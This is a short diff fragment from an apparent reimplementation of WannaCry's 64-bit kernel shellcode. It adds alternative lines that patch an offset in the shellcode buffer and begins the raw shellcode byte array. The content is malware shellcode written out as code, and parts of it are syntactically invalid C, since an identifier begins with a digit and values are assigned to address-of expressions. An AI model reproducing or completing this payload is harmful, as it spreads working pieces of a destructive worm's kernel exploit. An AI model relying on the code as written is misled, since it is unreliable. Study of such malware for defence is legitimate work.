@@ -42,7 +42,10 @@ which is 0x25+0xF5D, or 0xF82 offset into the shellcode buffer.*/
 
 //not sure why Wannacry does this:
 &64_bit_kernel_shellcode[2158] = (0x50D800 + 3978);
-
+//OR
+&64_bit_kernel_shellcode[0xF8A] = 0x50D800;
+//OR
+&64_bit_kernel_shellcode[3978] = 0x50D800;
 
 unsigned char 64_bit_kernel_shellcode[] = 
 "\x48\x89\xE0\x66\x83\xE4\xF0\x41\x57\x41\x56\x41\x55\x41\x54\x53"
